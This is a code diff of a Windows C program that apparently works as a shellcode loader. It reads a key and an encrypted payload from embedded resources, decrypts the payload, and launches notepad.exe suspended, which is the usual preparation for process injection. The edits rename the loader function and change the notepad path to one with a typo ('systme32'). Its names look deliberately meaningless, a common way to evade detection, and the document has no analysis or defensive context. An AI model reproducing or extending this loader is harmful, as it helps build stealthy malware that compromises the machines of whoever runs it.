@@ -5,7 +5,7 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void helloworld(const char* resName, char** data, DWORD* size) {
+void thisistheloadresou(const char* resName, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
     
@@ -25,11 +25,11 @@ int main() {
 
     char* dank1e6ENC;
     DWORD dank1e6ENCLen;
-    helloworld("dhanushkey1", &dank1e6ENC, &dank1e6ENCLen);
+    thisistheloadresou("dhanushkey1", &dank1e6ENC, &dank1e6ENCLen);
 
     char* codfhu;
     DWORD codfhuLen;
-    helloworld("dhanushcode56", &codfhu, &codfhuLen);
+    thisistheloadresou("dhanushcode56", &codfhu, &codfhuLen);
 
     youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
 
@@ -37,7 +37,7 @@ int main() {
     PROCESS_INFORMATION procin = {0};
     si.cb = sizeof(si);
 
-    CreateProcess("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &procin);
+    CreateProcess("C:\\Windows\\systme32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &procin);
       
 
     
